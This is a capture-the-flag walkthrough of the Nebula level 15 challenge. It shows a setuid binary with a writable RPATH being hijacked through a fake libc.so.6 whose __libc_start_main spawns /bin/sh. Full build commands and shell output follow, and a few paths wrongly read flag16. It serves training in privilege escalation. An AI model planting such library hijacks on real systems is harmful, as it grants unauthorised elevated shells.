Question URL: https://exploit.education/nebula/level-15/

Source code: None

Information Gatering:
a. Basic information. A program, /home/flag15/flag15 with setuid bit set. When you run the program, it just says, "strace it"
level15@nebula:/home/flag15$ ls -al
total 12
drwxr-x--- 2 flag15 level15   80 2011-11-20 21:22 .
drwxr-xr-x 1 root   root     100 2012-08-27 07:18 ..
-rw-r--r-- 1 flag15 flag15   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag15 flag15  3353 2011-05-18 02:54 .bashrc
-rwsr-x--- 1 flag15 level15 7161 2011-11-20 21:22 flag15
-rw-r--r-- 1 flag15 flag15   675 2011-05-18 02:54 .profile
level15@nebula:/home/flag15$ ./flag15
strace it!

b. Let's strace the program. It seems the program tries to load shared libraries from /var/tmp/flag15 but all loading try fails 
as there is no actual shared library of libc.so.6.

** Background knowledge of loading shared libraries **
** ELF means Executable and Linking Foramt
** rpath means run-time search path hard-coded in an executable file or library
#######################################################
Ref: manpage of dlopen()
   : https://en.wikipedia.org/wiki/Rpath
   : https://stackoverflow.com/questions/7967848/use-rpath-but-not-runpath
   
- When a program runs, it loads all required shared libraries on the memory with the order of following.
 a. (ELF only) if DT_RPATH tag is set and does not contain a DT_RUNPATH tag with the program
 b. Search LD_LIBRARY_PATH path specified as environment variable.
   : Ignored if the executable has setuid or setgid set
 c. (ELF only) if DT_RUNPATH tag is set, search
 d. /ect/ld.so.cache (maintained by ldconfig)
 e. /lib and /usr/lib
 ** Difference DT_RPATH and DT_RUNPATH: Functionally same where the path is hard-coded within a program. Difference is DT_RPATH has 
 the highest order and cannot be overridden by any others. Howerver DT_RUNPATH can be overridden by LD_LIBRARY_PATH **
#######################################################


level15@nebula:/home/flag15$ strace ./flag15
execve("./flag15", ["./flag15"], [/* 19 vars */]) = 0
brk(0)                                  = 0x9d83000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7701000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2/cmov", 0xbfb39514) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2", 0xbfb39514) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/cmov", 0xbfb39514) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686", 0xbfb39514) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/sse2/cmov", 0xbfb39514) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/sse2", 0xbfb39514) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/cmov", 0xbfb39514) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls", 0xbfb39514) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/sse2/cmov", 0xbfb39514) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/sse2", 0xbfb39514) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/cmov", 0xbfb39514) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686", 0xbfb39514) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/sse2/cmov", 0xbfb39514) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/sse2", 0xbfb39514) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/cmov", 0xbfb39514) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15", {st_mode=S_IFDIR|0775, st_size=80, ...}) = 0
open("/etc/ld.so.cache", O_RDONLY)      = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=33815, ...}) = 0
mmap2(NULL, 33815, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb76f8000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1544392, ...}) = 0
mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x417000
mmap2(0x58d000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0x58d000
mmap2(0x590000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x590000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb76f7000
set_thread_area({entry_number:-1 -> 6, base_addr:0xb76f78d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0x58d000, 8192, PROT_READ)     = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0x629000, 4096, PROT_READ)     = 0
munmap(0xb76f8000, 33815)               = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7700000
write(1, "strace it!\n", 11strace it!
)            = 11
exit_group(11)                          = ?

c. Idea: How to attack this?
- As the program loads the shared libraries before it executes, if we create a custom shared library with the same name of libc.so.6 
then place it under rpath is set (/var/tmp/flag16), the program running with flag16 privilege will execute my custom code.

d. Useful tool
- objdump: Display information from object files (Executable, Shared library)
  : Option
    -p, --private-headers: Display object format specific file header contents
  level15@nebula:/var/tmp/flag15$ objdump -p /home/flag15/flag15

/home/flag15/flag15:     file format elf32-i386

Program Header:
    PHDR off    0x00000034 vaddr 0x08048034 paddr 0x08048034 align 2**2
         filesz 0x00000120 memsz 0x00000120 flags r-x
  INTERP off    0x00000154 vaddr 0x08048154 paddr 0x08048154 align 2**0
         filesz 0x00000013 memsz 0x00000013 flags r--
    LOAD off    0x00000000 vaddr 0x08048000 paddr 0x08048000 align 2**12
         filesz 0x000005d4 memsz 0x000005d4 flags r-x
    LOAD off    0x00000f0c vaddr 0x08049f0c paddr 0x08049f0c align 2**12
         filesz 0x00000108 memsz 0x00000110 flags rw-
 DYNAMIC off    0x00000f20 vaddr 0x08049f20 paddr 0x08049f20 align 2**2
         filesz 0x000000d0 memsz 0x000000d0 flags rw-
    NOTE off    0x00000168 vaddr 0x08048168 paddr 0x08048168 align 2**2
         filesz 0x00000044 memsz 0x00000044 flags r--
EH_FRAME off    0x000004dc vaddr 0x080484dc paddr 0x080484dc align 2**2
         filesz 0x00000034 memsz 0x00000034 flags r--
   STACK off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**2
         filesz 0x00000000 memsz 0x00000000 flags rw-
   RELRO off    0x00000f0c vaddr 0x08049f0c paddr 0x08049f0c align 2**0
         filesz 0x000000f4 memsz 0x000000f4 flags r--

Dynamic Section:
  NEEDED               libc.so.6
  RPATH                /var/tmp/flag15
  INIT                 0x080482c0
  FINI                 0x080484ac
  GNU_HASH             0x080481ac
  STRTAB               0x0804821c
  SYMTAB               0x080481cc
  STRSZ                0x0000005a
  SYMENT               0x00000010
  DEBUG                0x00000000
  PLTGOT               0x08049ff4
  PLTRELSZ             0x00000018
  PLTREL               0x00000011
  JMPREL               0x080482a8
  REL                  0x080482a0
  RELSZ                0x00000008
  RELENT               0x00000008
  VERNEED              0x08048280
  VERNEEDNUM           0x00000001
  VERSYM               0x08048276

Version References:
  required from libc.so.6:
    0x0d696910 0x00 02 GLIBC_2.0

- ldd: Print shared library depedencies
level15@nebula:/var/tmp/flag15$ ldd /home/flag15/flag15
        linux-gate.so.1 =>  (0x00645000)
        libc.so.6 => /var/tmp/flag15/libc.so.6 (0x0038f000)



Now I need to how to build a shared library.

** How to build a shared library with libc.so.6 initial main function example **
#########################################################################
Ref: Shared libraries with GCC on Linux: https://www.cprogramming.com/tutorial/shared-libraries-linux-gcc.html
     (This is for building a general shared library. In our case, we need to know the actual start function of library (libc.so.6) )
     Building a shared library using gcc: http://www.microhowto.info/howto/build_a_shared_library_using_gcc.html
     What is excutable and how main() starts: https://linuxgazette.net/issue84/hawk.html

- Initial fuction defintion (__libc_start_main()) of libc.so.6 and exploit code.
// Filename: shell.c
#include <stdio.h>
#include <stdlib.h>
// __libc_start_main () is a function in libc.so.6.
/*
extern int BP_SYM (__libc_start_main) (int (*main) (int, char **, char **),
                int argc,
                char *__unbounded *__unbounded ubp_av,
                void (*init) (void),
                void (*fini) (void),
                void (*rtld_fini) (void),
                void *__unbounded stack_end)
__attribute__ ((noreturn));
*/
int __libc_start_main(int (*main) (int, char **, char **), int argc, char **ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void *stack_end)
{
    system("/bin/sh");
    return 0;
}

Step 1: Compiling with Position Independent Code
$ gcc -c -Wall -Werror -fpic /var/tmp/flag16/shell.c
* -Wall: This enables all the warnings about constructions that some users consider questionable and that are easy to avoid
* -fpic: This option is needed when linking as it was when compiling to ensure that any code added by the linker is compatible 
with code previously generated by the compiler.
* -Werror: Make all warnings into errors

Step 2: Create a version script file
- What is a version script file?
(Ref: https://www.gnu.org/software/gnulib/manual/html_node/LD-Version-Scripts.html)
: The lib-symbol-versions module can be used to add shared library versioning support. 
Currently, only GNU LD and the Solaris linker supports this.

- Simple example of LD version script file
LIBFOO_1.0 {
  global:
    libfoo_init; libfoo_doit; libfoo_done;

  local:
    *;
};

- LD version script for our exploit shared library (No need any additional info)
GLIBC_2.0{
};

- Why do we need this?
/home/flag15/flag15 program checks the version information of library. Without using the LD Version script, we will see the following
error
./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by ./flag15)
./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)

Step 3: Creating a shared library from an object file with a version script file
gcc -shared -static-libgcc -fPIC -Wl,--version-script=version.ld,-Bstatic shell.c -o libc.so.6

* -Wl,option: This option passes a comma-separated list of arguments to the linker. If these options are omitted then the library will 
not have options specified.
* -static-libgcc: This option forces the use of either the shared or static version respectively. 
* -Bstatic: This option is passed down to the linker for compatibility with Diab.

#########################################################################

Let's hack it!
a. Compiling shared library
level15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,--version-script=version.ld,-Bstatic shell.c -o libc.so.6

level15@nebula:/var/tmp/flag15$ ls -al
total 780
drwxrwxr-x 1 level15 level15    100 2019-02-19 07:44 .
drwxrwxrwt 1 root    root        60 2019-02-19 07:08 ..
-rwxrwxr-x 1 level15 level15 779364 2019-02-19 07:44 libc.so.6
-rw-rw-r-- 1 level15 level15    569 2019-02-19 06:23 shell.c
-rw-rw-r-- 1 level15 level15     14 2019-02-19 05:52 version.ld

b. Execute falg15
level15@nebula:/var/tmp/flag15$ /home/flag15/flag15
sh-4.2$ id
uid=1016(level15) gid=1016(level15) euid=984(flag15) groups=984(flag15),1016(level15)
sh-4.2$ getflag
You have successfully executed getflag on a target account


